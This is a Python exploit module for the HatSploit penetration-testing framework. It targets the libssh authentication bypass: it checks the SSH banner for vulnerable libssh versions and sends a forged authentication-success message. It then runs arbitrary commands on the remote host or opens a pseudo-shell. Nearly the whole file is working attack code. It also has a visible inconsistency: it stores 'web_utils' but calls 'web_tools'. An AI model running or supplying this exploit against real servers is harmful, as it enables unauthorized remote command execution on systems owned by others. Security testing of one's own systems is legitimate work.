#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import socket
import paramiko

from core.cli.parser import parser
from core.cli.badges import badges

from utils.pseudo_shell import pseudo_shell
from utils.web_tools import web_tools

class HatSploitModule:
    def __init__(self):
        self.parser = parser()
        self.badges = badges()

        self.pseudo_shell = pseudo_shell()
        self.web_utils = web_tools()
        
        self.buffer_size = 2048
        self.client = None

        self.details = {
            'Name': "SSH LibSSH Code Execution",
            'Module': "exploit/multi/ssh/libssh_code_execution",
            'Authors': [
                'enty8080'
            ],
            'Description': "SSH LibSSH unauthorized access Remote Code Execution.",
            'Dependencies': [
                'paramiko'
            ],
            'Comments': [
                ''
            ],
            'Risk': "medium"
        }

        self.options = {
            'RHOST': {
                'Description': "Remote host.",
                'Value': None,
                'Required': True
            },
            'RPORT': {
                'Description': "Remote port.",
                'Value': 2222,
                'Required': True
            },
            'COMMAND': {
                'Description': "Command to execute",
                'Value': "id",
                'Required': True
            },
            'PSEUDO': {
                'Description': "Spawn Pseudo shell.",
                'Value': "no",
                'Required': False
            }
        }

    def execute_command(self, target_host, target_port, command):
        self.badges.output_process("Attempting to execute command...")
        try:
            self.connect(target_host, target_port)
            self.client.exec_command(command)

            stdout = self.client.makefile("rb", self.buffer_size)
            output = stdout.read().decode().strip()
            stdout.close()

            if output:
                self.badges.output_information("Command output:")
                self.badges.output_empty(output)
            else:
                self.badges.output_warning("No output provided by command.")
        except Exception:
            self.badges.output_error("Failed to execute command!")

    def obtain_banner(self, remote_host, remote_port):
        try:
            sock = socket.create_connection((remote_host, int(remote_port)))
            sock.settimeout(5)
            banner = sock.recv(self.buffer_size)
            sock.close()

            return banner.split(b'\n')[0].decode().strip()
        except Exception:
            return None

    def check_vulnerable(self, remote_host, remote_port):
        banner = self.obtain_banner(remote_host, remote_port)

        if banner:
            if any(version in banner for version in ['libssh-0.6', 'libssh_0.6']):
                return True
            if any(version in banner for version in ['libssh-0.7', 'libssh_0.7']):
                if int(banner.split('.')[-1]) < 6:
                    return True
            if any(version in banner for version in ['libssh-0.8', 'libssh_0.8']):
                if int(banner.split('.')[-1]) < 4:
                    return True
        return False

    def connect(self, remote_host, remote_port):
        sock = socket.socket()
        sock.connect((remote_host, int(remote_port)))

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        self.client = transport.open_session(timeout=5)

    def run(self):
        remote_host, remote_port, command, pseudo = self.parser.parse_options(self.options)
        
        target = self.web_tools.format_host_and_port(remote_host, remote_port)
        self.badges.output_process("Exploiting " + target + "...")
        
        if not self.check_vulnerable(remote_host, remote_port):
            self.badges.output_error("Failed to exploit!")
            return

        if pseudo in ['yes', 'y']:
            arguments = (remote_host, remote_port)
            self.pseudo_shell.spawn_pseudo_shell(self.details['Module'], self.execute_command, arguments)
        else:
            self.execute_command(remote_host, remote_port, command)
